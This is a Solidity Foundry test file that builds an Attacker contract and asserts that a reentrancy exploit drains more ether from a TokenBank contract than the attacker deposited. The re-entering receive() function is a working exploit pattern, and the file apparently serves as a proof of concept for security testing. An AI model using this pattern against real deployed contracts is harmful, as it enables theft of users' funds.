// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract Attacker {
    TokenBank public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedVal;
    address public owner;

    constructor(address victimAddress) {
        victim = TokenBank(payable(victimAddress));
    }

    function setOwner(address _owner) external {
        owner = _owner;
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit into the TokenBank to establish a balance in Holders mapping
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedVal = val;
        attackCallCount = 1;

        uint256 victimBalanceBefore = address(victim).balance;

        // The owner calls WithdrawToHolder
        TestReentrancyTokenBank(payable(owner)).triggerWithdraw(address(this), val);

        uint256 totalReceived = address(this).balance - initialSnapshot;
        if (totalReceived > val && attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2 && address(victim).balance >= storedVal) {
            attackCallCount++;
            TestReentrancyTokenBank(payable(owner)).triggerWithdraw(address(this), storedVal);
        }
    }
}

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        _attacker = new Attacker(address(_contractUnderTest));
        _attacker.setOwner(address(this));
    }

    function triggerWithdraw(address to, uint256 amount) external {
        _contractUnderTest.WithdrawToHolder(to, amount);
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 3. Funding ---
        vm.deal(address(_contractUnderTest), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // --- 4. Setup attacker's deposit in TokenBank ---
        _attacker.setupAttack{value: attackVal}(attackVal);

        // --- 5. Trigger Attack ---
        _attacker.attack(attackVal);

        // --- 6. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}
